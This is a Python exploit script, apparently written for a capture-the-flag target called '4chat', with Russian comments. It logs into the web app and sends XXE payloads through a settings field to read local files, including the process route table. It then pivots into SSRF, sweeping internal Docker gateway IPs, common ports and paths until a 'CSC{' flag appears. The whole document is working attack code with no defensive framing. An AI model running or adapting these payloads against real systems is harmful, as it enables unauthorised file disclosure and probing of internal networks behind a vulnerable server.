#!/usr/bin/env python3
# ssrf_sweep_4chat.py
import argparse, html, ipaddress, re, requests

PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.S)
NETSTAT_SENTINEL = "sl  local_address"

COMMON_PORTS = [80, 443, 5000, 7000, 8000, 8080, 8081, 8888, 9000, 10000, 1337]
COMMON_PATHS = ["/", "/flag", "/fl4g", "/FLAG", "/api/flag", "/admin/flag",
                "/internal/flag", "/getflag", "/debug", "/metrics",
                "/health", "/robots.txt", "/version", "/env", "/status"]

def login(sess: requests.Session, base: str, user: str, pwd: str):
    return sess.post(f"{base.rstrip('/')}/login",
                     data={"command": f"/login {user} {pwd}"},
                     allow_redirects=True, timeout=10)

def post_xmldata(sess: requests.Session, base: str, xml: str) -> str:
    r = sess.post(f"{base.rstrip('/')}/settings",
                  data={"profession": "ssrf", "xmldata": xml},
                  allow_redirects=True, timeout=20)
    m = PRE_RE.search(r.text)
    return html.unescape((m.group(1).strip() if m else "").strip())

def xxe_fetch_url(sess: requests.Session, base: str, url: str) -> str:
    xml = f'''<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "{url}">]>
<settings><profession>&xxe;</profession></settings>'''
    return post_xmldata(sess, base, xml)

def xxe_read_file(sess: requests.Session, base: str, path: str) -> str:
    xml = f'''<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file://{path}">]>
<settings><profession>&xxe;</profession></settings>'''
    return post_xmldata(sess, base, xml)

def parse_gateways(route_text: str):
    # /proc/net/route: Gateway в hex (LE). Берём все != 0
    gws = set()
    for line in route_text.splitlines()[1:]:
        parts = line.split()
        if len(parts) < 3: continue
        gw_hex = parts[2]
        if gw_hex == "00000000": continue
        try:
            b0 = int(gw_hex[0:2], 16)
            b1 = int(gw_hex[2:4], 16)
            b2 = int(gw_hex[4:6], 16)
            b3 = int(gw_hex[6:8], 16)
            ip = f"{b0}.{b1}.{b2}.{b3}"
            # роут даётся в LE, инвертируем порядок
            ip = ".".join(ip.split(".")[::-1])
            ipaddress.IPv4Address(ip)
            gws.add(ip)
        except Exception:
            continue
    return sorted(gws)

def main():
    ap = argparse.ArgumentParser(description="Sweep internal IPs/ports/paths via XXE→SSRF (4chat)")
    ap.add_argument("base")
    ap.add_argument("user")
    ap.add_argument("pwd")
    ap.add_argument("--ports", nargs="*", type=int, default=COMMON_PORTS)
    ap.add_argument("--paths", nargs="*", default=COMMON_PATHS)
    ap.add_argument("--ips", nargs="*", default=[], help="Override/add IPs to scan")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    s = requests.Session()
    login(s, args.base, args.user, args.pwd)
    try: s.get(f"{args.base.rstrip('/')}/chat", timeout=10)
    except Exception: pass

    # кандидаты IP
    ip_candidates = set(args.ips)
    # docker bridge по умолчанию
    ip_candidates.update(["172.17.0.1", "172.18.0.1", "172.19.0.1", "172.20.0.1"])
    # вытащим шлюзы из маршрутов PID1
    rt = xxe_read_file(s, args.base, "/proc/1/root/proc/net/route")
    for gw in parse_gateways(rt):
        ip_candidates.add(gw)

    if args.verbose:
        print("[*] Gateways from /proc/net/route:", parse_gateways(rt))
        print("[*] IP candidates:", sorted(ip_candidates))
        print("[*] Ports:", args.ports)
        print("[*] Paths:", args.paths)

    for ip in sorted(ip_candidates):
        for port in args.ports:
            scheme = "http"
            for path in args.paths:
                url = f"{scheme}://{ip}:{port}{path}"
                try:
                    body = xxe_fetch_url(s, args.base, url)
                except Exception as e:
                    if args.verbose: print(f"[-] {url} error: {e}")
                    continue
                if not body:  # пусто
                    if args.verbose: print(f"[?] {url}: empty")
                    continue
                # фильтруем «заглушку-нетстат»
                if NETSTAT_SENTINEL in body.splitlines()[0]:
                    if args.verbose: print(f"[~] {url}: netstat-sentinel")
                    continue
                print(f"\n===== {url} =====\n{body}\n")
                if "CSC{" in body:
                    return

if __name__ == "__main__":
    main()
